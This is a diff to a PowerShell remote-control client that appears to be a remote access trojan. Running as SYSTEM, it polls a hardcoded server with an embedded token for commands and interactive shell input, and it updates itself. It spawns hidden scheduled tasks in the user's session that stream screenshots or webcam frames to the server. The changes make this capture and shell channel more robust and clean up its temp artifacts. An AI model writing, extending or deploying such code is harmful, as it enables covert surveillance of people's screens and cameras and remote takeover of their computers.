@@ -2,7 +2,7 @@
 # ║  CONFIGURATION                                                             ║
 # ║  Edit these values to match your setup. All features reference these vars. ║
 # ╚══════════════════════════════════════════════════════════════════════════════╝
-$Version = "3.2.8"
+$Version = "3.3.0"
 $cfHost = "https://connect.aniketpandey.website"
 $cfToken = "81f7cc9dca3ded71456c89a83b8a5325fc7d9a345b76c7ac6eba8aa96fdd3782"  # must match server.py TOKEN
 $maxRetries = 10
@@ -114,6 +114,34 @@ try {
     powercfg /setactive SCHEME_CURRENT 2>$null
 } catch {}
 
+# Helper: temp dir writable by a task running as the logged-on user.
+# Spawned scheduled tasks execute as the USER, but were previously pointed at
+# $env:TEMP (C:\Windows\Temp under SYSTEM) — the user cannot write there, so
+# capture/camera artifacts failed silently. Use the user's own temp instead.
+function Get-UserTempDir {
+    param([string]$LoggedOnUser)
+    if (-not $LoggedOnUser) { return $env:TEMP }
+    $u = ($LoggedOnUser -split '\\')[-1]
+    $dir = "C:\Users\$u\AppData\Local\Temp"
+    if (Test-Path $dir) { return $dir }
+    return $env:TEMP
+}
+
+# Sweep leftover camera/capture task files from EVERY candidate temp:
+# SYSTEM's TEMP (legacy) and all user profile temps (current layout).
+function Remove-CaptureArtifacts {
+    $filters = @('cam_*.ps1','cam_err_*.txt','cap_*.ps1','cap_out_*.jpg','cap_err_*.txt')
+    $dirs = @($env:TEMP)
+    try {
+        $dirs += Get-ChildItem 'C:\Users' -Directory -ErrorAction SilentlyContinue | ForEach-Object { Join-Path $_.FullName 'AppData\Local\Temp' }
+    } catch {}
+    foreach ($d in ($dirs | Select-Object -Unique)) {
+        foreach ($f in $filters) {
+            try { Get-ChildItem (Join-Path $d $f) -File -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue } catch {}
+        }
+    }
+}
+
 # --- CLEANUP ORPHANED TASKS AND TEMP FILES (from previous crashes) ---
 try {
     Get-ScheduledTask -TaskName "GUI_*" -ErrorAction SilentlyContinue | ForEach-Object {
@@ -126,13 +154,7 @@ try {
         Unregister-ScheduledTask -TaskName $_.TaskName -Confirm:$false -ErrorAction SilentlyContinue
     }
 } catch {}
-try {
-    Get-ChildItem $env:TEMP -Filter 'cam_*.ps1'      -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
-    Get-ChildItem $env:TEMP -Filter 'cam_err_*.txt'   -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
-    Get-ChildItem $env:TEMP -Filter 'cap_*.ps1'       -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
-    Get-ChildItem $env:TEMP -Filter 'cap_out_*.jpg'   -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
-    Get-ChildItem $env:TEMP -Filter 'cap_err_*.txt'   -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
-} catch {}
+try { Remove-CaptureArtifacts } catch {}
 try {
     Get-ScheduledTask -TaskName "Capture_*" -ErrorAction SilentlyContinue | ForEach-Object {
         try { Stop-ScheduledTask  -TaskName $_.TaskName -ErrorAction SilentlyContinue } catch {}
@@ -175,6 +197,7 @@ function Update-Self {
             $wc2.Dispose()
         } catch {
             Write-Log "Update download failed: $($_.Exception.Message)" "WARN"
+            Remove-Item $tempFile -Force -ErrorAction SilentlyContinue
             return $false
         }
 
@@ -296,7 +319,8 @@ function Get-Command-From-Server {
 }
 
 function Get-Signal-From-Server {
-    try { return (Send-Http -Url "$cfHost/signal?id=$clientId" -TimeoutMs 3000).Trim() } catch { return "" }
+    # $null on transport failure so callers can tell "no signal" apart from "server down"
+    try { return (Send-Http -Url "$cfHost/signal?id=$clientId" -TimeoutMs 3000).Trim() } catch { return $null }
 }
 
 function Get-Camera-Signal-From-Server {
@@ -351,7 +375,8 @@ function Send-Result-To-Server {
 
 function Get-Stdin-From-Server {
     # No Trim — preserves whitespace for interactive stdin payloads
-    try { return Send-Http -Url "$cfHost/stdin?id=$clientId" -TimeoutMs 3000 } catch { return "" }
+    # $null on transport failure so interactive sessions can detect a dead server
+    try { return Send-Http -Url "$cfHost/stdin?id=$clientId" -TimeoutMs 3000 } catch { return $null }
 }
 
 function Send-Interactive-Flag {
@@ -413,8 +438,9 @@ function Start-CameraStream {
     if ($isSystem -and $loggedOnUser) {
         # SYSTEM PATH: scheduled task runs as logged-on user, polls /signal to stop
         $taskId = "CameraCapture_$(Get-Random)"
-        $scriptPath = Join-Path $env:TEMP "cam_$taskId.ps1"
-        $errLog = Join-Path $env:TEMP "cam_err_$taskId.txt"
+        $taskTmp = Get-UserTempDir $loggedOnUser
+        $scriptPath = Join-Path $taskTmp "cam_$taskId.ps1"
+        $errLog = Join-Path $taskTmp "cam_err_$taskId.txt"
         $captureScript = @"
 param()
 `$ErrorActionPreference = 'Stop'
@@ -433,7 +459,8 @@ function UploadFrame([byte[]]`$data) {
         `$r=[System.Net.HttpWebRequest]::Create('$cfHost/camera_frame?id=$clientId')
         `$r.Method='POST';`$r.ContentType='image/jpeg';`$r.ContentLength=`$data.Length;`$r.Timeout=5000;`$r.ReadWriteTimeout=5000;`$r.UserAgent='Mozilla/5.0';`$r.Headers.Add('X-Token','81f7cc9dca3ded71456c89a83b8a5325fc7d9a345b76c7ac6eba8aa96fdd3782')
         `$s=`$r.GetRequestStream();`$s.Write(`$data,0,`$data.Length);`$s.Close();`$r.GetResponse().Close()
-    } catch {}
+        return `$true
+    } catch { return `$false }
 }
 function ShouldStop {
     try {
@@ -455,6 +482,8 @@ function ScreenshotJpeg {
     `$bmp.Dispose()
     return `$ms.ToArray()
 }
+Report "[*] Capture task alive in user session (1 fps)`n"
+`$failCount = 0
 # --- Find ffmpeg ---
 `$ffmpeg = `$null
 foreach (`$p in @('ffmpeg','C:\ffmpeg\bin\ffmpeg.exe','C:\Tools\ffmpeg.exe','C:\Windows\System32\ffmpeg.exe')) {
@@ -489,7 +518,8 @@ if (`$ffmpeg) {
                     `$proc.WaitForExit(4000) | Out-Null; `$proc.Dispose()
                     if (Test-Path `$tmpJpeg) {
                         `$bytes = [System.IO.File]::ReadAllBytes(`$tmpJpeg)
-                        if (`$bytes.Length -gt 500) { UploadFrame `$bytes }
+                        if (`$bytes.Length -gt 500) { if (UploadFrame `$bytes) { `$failCount = 0 } else { `$failCount++ } }
+                        if (`$failCount -ge 30) { Report "[!] 30 consecutive frame uploads failed - server unreachable, stopping capture task`n"; break }
                     }
                 } catch {}
                 finally { try { Remove-Item `$tmpJpeg -Force -ErrorAction SilentlyContinue } catch {} }
@@ -512,7 +542,8 @@ if (-not `$usedFfmpeg) {
         while (`$true) {
             try {
                 `$bytes = ScreenshotJpeg
-                UploadFrame `$bytes
+                if (UploadFrame `$bytes) { `$failCount = 0 } else { `$failCount++ }
+                if (`$failCount -ge 30) { Report "[!] 30 consecutive frame uploads failed - stopping capture task`n"; break }
                 `$i++
             } catch { break }
             if (`$i % 5 -eq 0 -and (ShouldStop)) { break }
@@ -576,7 +607,8 @@ if (-not `$usedFfmpeg) {
                 $req.Timeout=5000; $req.ReadWriteTimeout=5000; $req.UserAgent='Mozilla/5.0'
                 $s = $req.GetRequestStream(); $s.Write($data, 0, $data.Length); $s.Close()
                 $req.GetResponse().Close()
-            } catch {}
+                return $true
+            } catch { return $false }
         }
         function Report([string]$msg) {
             try {
@@ -600,6 +632,8 @@ if (-not `$usedFfmpeg) {
             $bmp.Dispose()
             return $ms.ToArray()
         }
+        Report "[*] Camera runspace alive (1 fps)`n"
+        $failCount = 0
         # --- Find ffmpeg ---
         $ffmpeg = $null
         foreach ($p in @('ffmpeg','C:\ffmpeg\bin\ffmpeg.exe','C:\Tools\ffmpeg.exe','C:\Windows\System32\ffmpeg.exe')) {
@@ -629,7 +663,8 @@ if (-not `$usedFfmpeg) {
                             $proc.WaitForExit(4000) | Out-Null; $proc.Dispose()
                             if (Test-Path $tmpJpeg) {
                                 $bytes = [System.IO.File]::ReadAllBytes($tmpJpeg)
-                                if ($bytes.Length -gt 500) { UploadFrame $bytes }
+                                if ($bytes.Length -gt 500) { if (UploadFrame $bytes) { $failCount = 0 } else { $failCount++ } }
+                                if ($failCount -ge 30) { Report "[!] 30 consecutive frame uploads failed - server unreachable, stopping stream`n"; break }
                             }
                         } catch {}
                         finally { try { Remove-Item $tmpJpeg -Force -ErrorAction SilentlyContinue } catch {} }
@@ -648,7 +683,8 @@ if (-not `$usedFfmpeg) {
                 while ($sharedState.CameraRunning) {
                     try {
                         $bytes = ScreenshotJpeg
-                        UploadFrame $bytes
+                        if (UploadFrame $bytes) { $failCount = 0 } else { $failCount++ }
+                        if ($failCount -ge 30) { Report "[!] 30 consecutive frame uploads failed - stopping stream`n"; break }
                         $i++
                     } catch { break }
                     Start-Sleep -Milliseconds 1000  # 1 fps — halves CPU/battery/bandwidth
@@ -830,6 +866,7 @@ function Invoke-InteractiveCommand {
     $idleCycles = 0
     $cancelled = $false
     $timedOut = $false
+    $abortedTransport = $false
     $pollFailures = 0
     $maxPollFailures = 15  # abort interactive session after this many transport failures
 
@@ -847,25 +884,33 @@ function Invoke-InteractiveCommand {
         }
 
         $stdinData = Get-Stdin-From-Server
-        if ($stdinData -eq "") {
-            # Could be empty response or transport failure — both return ""
+        if ($null -eq $stdinData) {
+            # Transport failure (server down/unreachable) — count hits and bail
+            # out instead of hanging this session forever on a dead server.
+            $pollFailures++
         } elseif ($stdinData) {
-            $pollFailures = 0  # successful poll
+            $pollFailures = 0  # successful poll with data
             foreach ($stdinLine in ($stdinData -split "`n")) {
                 $cleanLine = $stdinLine.TrimEnd("`r")
                 try { $proc.StandardInput.WriteLine($cleanLine) } catch {}
             }
             try { $proc.StandardInput.Flush() } catch {}
+        } else {
+            $pollFailures = 0  # healthy empty response (operator hasn't typed)
         }
 
         $signal = Get-Signal-From-Server
+        if ($null -eq $signal) { $pollFailures++ }
         if ($signal -eq "cancel") {
             try { if (-not $proc.HasExited) { $proc.Kill() } } catch {}
             $cancelled = $true
             break
         }
-        if ($signal -ne "") {
-            $pollFailures = 0
+
+        if ($pollFailures -ge $maxPollFailures) {
+            try { if (-not $proc.HasExited) { $proc.Kill() } } catch {}
+            $abortedTransport = $true
+            break
         }
 
         if (-not $NoTimeout) {
@@ -895,6 +940,9 @@ function Invoke-InteractiveCommand {
     } elseif ($timedOut) {
         Send-Result-To-Server -Body ($finalChunk + "[!] Command timed out after ${Timeout}s.`n")
         Write-Log "Interactive command timed out: $Command" "WARN"
+    } elseif ($abortedTransport) {
+        Send-Result-To-Server -Body ($finalChunk + "[!] Interactive session aborted: $maxPollFailures consecutive transport failures (server unreachable).`n")
+        Write-Log "Interactive session aborted after $maxPollFailures transport failures: $Command" "WARN"
     } else {
         Send-Result-To-Server -Body $finalChunk
     }
@@ -1210,13 +1258,7 @@ function Connect-Cloudflare {
                             Unregister-ScheduledTask -TaskName $_.TaskName -Confirm:$false -ErrorAction SilentlyContinue
                         }
                     } catch {}
-                    try {
-                        Get-ChildItem $env:TEMP -Filter 'cam_*.ps1'      -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
-                        Get-ChildItem $env:TEMP -Filter 'cam_err_*.txt'   -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
-                        Get-ChildItem $env:TEMP -Filter 'cap_*.ps1'       -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
-                        Get-ChildItem $env:TEMP -Filter 'cap_out_*.jpg'   -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
-                        Get-ChildItem $env:TEMP -Filter 'cap_err_*.txt'   -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
-                    } catch {}
+                    try { Remove-CaptureArtifacts } catch {}
                     try {
                         Get-ScheduledTask -TaskName "Capture_*" -ErrorAction SilentlyContinue | ForEach-Object {
                             try { Stop-ScheduledTask  -TaskName $_.TaskName -ErrorAction SilentlyContinue } catch {}
@@ -1245,13 +1287,7 @@ function Connect-Cloudflare {
                             Unregister-ScheduledTask -TaskName $_.TaskName -Confirm:$false -ErrorAction SilentlyContinue
                         }
                     } catch {}
-                    try {
-                        Get-ChildItem $env:TEMP -Filter 'cam_*.ps1'      -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
-                        Get-ChildItem $env:TEMP -Filter 'cam_err_*.txt'  -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
-                        Get-ChildItem $env:TEMP -Filter 'cap_*.ps1'      -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
-                        Get-ChildItem $env:TEMP -Filter 'cap_out_*.jpg'  -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
-                        Get-ChildItem $env:TEMP -Filter 'cap_err_*.txt'  -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
-                    } catch {}
+                    try { Remove-CaptureArtifacts } catch {}
                     try {
                         Get-ScheduledTask -TaskName "CameraCapture_*" -ErrorAction SilentlyContinue | ForEach-Object {
                             try { Stop-ScheduledTask  -TaskName $_.TaskName -ErrorAction SilentlyContinue } catch {}
@@ -1295,6 +1331,13 @@ function Connect-Cloudflare {
                     } else {
                         Send-Result-To-Server -Body "[*] Already running latest version (v$Version).`n"
                     }
+                    Start-Sleep -Milliseconds $activeDelay
+                    continue
+                }
+
+                if ($command -eq "clear" -or $command -eq "cls") {
+                    # Host-buffer clearing has no console here — erroring hosts (CursorPosition) logged otherwise.
+                    Send-Result-To-Server -Body "[*] (clear) no-op: remote host has no console buffer`n"
                     Start-Sleep -Milliseconds $activeDelay
                     continue
                 }
@@ -1353,9 +1396,10 @@ function Connect-Cloudflare {
                             } catch {}
 
                             $capTaskId  = "Capture_$(Get-Random)"
-                            $capScript  = Join-Path $env:TEMP "cap_$capTaskId.ps1"
-                            $capOut     = Join-Path $env:TEMP "cap_out_$capTaskId.jpg"
-                            $capErr     = Join-Path $env:TEMP "cap_err_$capTaskId.txt"
+                            $capTmp     = Get-UserTempDir $loggedOnUser
+                            $capScript  = Join-Path $capTmp "cap_$capTaskId.ps1"
+                            $capOut     = Join-Path $capTmp "cap_out_$capTaskId.jpg"
+                            $capErr     = Join-Path $capTmp "cap_err_$capTaskId.txt"
                             $capCode = @"
 
 # Suppress Windows error dialog popups (silent execution)
